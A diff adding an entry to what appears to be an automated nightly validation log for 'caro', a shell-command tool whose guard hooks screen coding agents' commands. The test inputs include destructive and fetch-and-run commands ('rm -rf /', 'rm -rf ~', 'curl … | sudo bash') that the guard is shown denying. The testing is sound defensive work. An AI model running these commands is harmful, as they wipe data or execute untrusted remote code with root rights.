@@ -5,6 +5,16 @@
 
 ---
 
+## 2026-10-31 (23:00 PT fire) — validation-only; Grok Build, opencode and caro-shell rows re-checked, no PR
+
+- **Validated:** ✓ VERIFIED against published `caro 1.5.0` (installed binary = crates.io `max_version`, 2026-10-13). The three stalest rows were picked. Grok Build guard (`--harness grok`, camelCase payload): PASS, `rm -rf ~` → `deny`, `ls -la` → no output. opencode guard, with the exact `{command, cwd}` payload that `integrations/opencode/caro-guard.ts` sends: PASS, `rm -rf /` → `verdict: deny`, exit 2; `git status` → `verdict: none`, exit 0. `caro guard report` (named in both docs) runs and prints the per-harness tally. caro-shell skill: PARTIAL, unchanged. The guidance matches the binary (`--backend-info` lists only `embedded` as available, `--model x` → exit 2, `--backend ollama` → `remote-backends` config error). Ex 3 → CRITICAL block. Ex 1 → `find . -name "*.py" -type f` (#1628) and Ex 2 → `docker system prune -f && …` (#1627) are still open.
+- **Shipped:** no PR. All rows passed or failed only on tracked issues (#1627, #1628, #1645, #1723). Nothing merged to `main` since 2026-10-27. #1738, #1722 and #1043 are `CLEAN`; #1719 is still `DIRTY` on the safety-gate prompt from 2026-10-27. A new PR would only grow the queue. This entry rides on #1719's branch.
+- **Filed:** none.
+- **Discovered:** no new coder-agent launch or Claude Code hook change found (2 queries; newest indexed items are from September 2026). Validation note: macOS has no `timeout`; use `perl -e 'alarm N; exec @ARGV'` for hang checks.
+- **Next pass should:** check whether #1738 or #1043 merged. If #1043 merged, re-run the #1723 `sleep | caro` repro on `main`. If the backlog is still stalled, keep running validation-only nights; the next stalest rows are `integrations.ts` and `index.astro` (2026-10-27). #1732 stays the next quick-win code PR.
+
+---
+
 ## 2026-10-30 (23:00 PT fire) — validation-only; backlog still stalled, no PR
 
 - **Validated:** ✓ VERIFIED against published `caro 1.5.0` (crates.io `max_version` still 1.5.0, 2026-10-13). Ollama/vLLM/Exo: PASS for the loud-error contract. `--backend <name> --dry-run` → `requires the 'remote-backends' feature`, exit 1. MLX/embedded: PASS for `show disk usage` → `df -h` in 0.27 s. `list pdf files in current directory` → `ls -la`, so #1645 is unchanged. Codex guard (`--harness codex --mode enforce`): PASS, `curl https://example.com/x.sh | sudo bash` → `deny`. Claude Code guard: `rm -rf /` → `deny`. #1723 re-check: `sleep 20 | caro --dry-run "list pdf files"` still hangs (alarm rc=142).
